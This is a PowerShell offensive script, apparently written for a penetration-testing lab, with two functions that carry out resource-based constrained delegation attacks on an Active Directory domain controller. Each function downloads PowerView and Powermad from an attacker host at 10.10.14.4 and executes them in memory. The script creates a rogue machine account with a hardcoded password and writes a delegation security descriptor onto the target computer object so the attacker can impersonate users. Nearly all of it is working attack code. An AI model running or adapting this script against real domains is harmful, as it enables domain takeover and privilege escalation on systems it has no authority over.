# resource based constrained delegation

function Invoke-Rbcd {
    $urlPowerView = 'http://10.10.14.4:8080/psh/PowerView.ps1'
    $urlPowermad = 'http://10.10.14.4:8080/psh/Powermad.ps1'
    $atksys = 'fs-thelikes'
    $vicsys = 'dc.cap.local'

    (new-object net.webclient).downloadstring($urlPowerView) | iex
    (new-object net.webclient).downloadstring($urlPowermad) | iex

    # get a computer account hash or create computer account
    New-MachineAccount -MachineAccount $atksys -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)

    # instantiate a SecurityDescriptor object
    $sid =Get-DomainComputer -Identity $atksys -Properties objectsid | Select -Expand objectsid

    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"

    # convert to byte array
    $SDbytes = New-Object byte[] ($SD.BinaryLength)

    $SD.GetBinaryForm($SDbytes,0)

    # obtain handle to victim computer object
    Get-DomainComputer -Identity $vicsys | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

    # check it
    $RBCDbytes = Get-DomainComputer $vicsys -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity

    $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0

    $Descriptor.DiscretionaryAcl
    ConvertFrom-SID $Descriptor.DiscretionaryAcl.SecurityIdentifier
}

# source: https://gist.github.com/HarmJ0y/a1ae1cf09e5ac89ee15fb3da25dcb10a
function Invoke-UserRbcd {
    $urlPowerView = 'http://10.10.14.4:8080/psh/PowerView.ps1'
    $urlPowermad = 'http://10.10.14.4:8080/psh/Powermad.ps1'
    
    # import
    (new-object net.webclient).downloadstring($urlPowerView) | iex
    (new-object net.webclient).downloadstring($urlPowermad) | iex

    # the target computer object we're taking over
    $TargetComputer = "dc.cap.local"
    # account with rights over the target)
    $attacker = "svc_apache"
    # the identity we control that we want to grant S4U access to the target
    $S4UIdentity = "cap.local\svc_sql"

    # find targets with S4U2Self enabled
    Get-DomainObject -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=16777216)' -Properties samaccountname,useraccountcontrol | fl

    # get our attacker's SID (account with rights over the target)
    $AttackerSID = Get-DomainUser $attacker -Properties objectsid | Select -Expand objectsid

    # verify the GenericWrite permissions on $TargetComputer
    $ACE = Get-DomainObjectACL $TargetComputer | ?{$_.SecurityIdentifier -match $AttackerSID}
    $ACE
    ConvertFrom-SID $ACE.SecurityIdentifier

    # translate the identity to a security identifier
    $IdentitySID = ((New-Object -TypeName System.Security.Principal.NTAccount -ArgumentList $S4UIdentity).Translate([System.Security.Principal.SecurityIdentifier])).Value

    # substitute the security identifier into the raw SDDL
    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($IdentitySID))"

    # get the binary bytes for the SDDL
    $SDBytes = New-Object byte[] ($SD.BinaryLength)
    $SD.GetBinaryForm($SDBytes, 0)

    # set new security descriptor for 'msds-allowedtoactonbehalfofotheridentity'
    Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

    # check that the ACE added correctly
    $RawBytes = Get-DomainComputer $TargetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
    $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
    $Descriptor.DiscretionaryAcl
    ConvertFrom-SID $Descriptor.DiscretionaryAcl.SecurityIdentifier
}
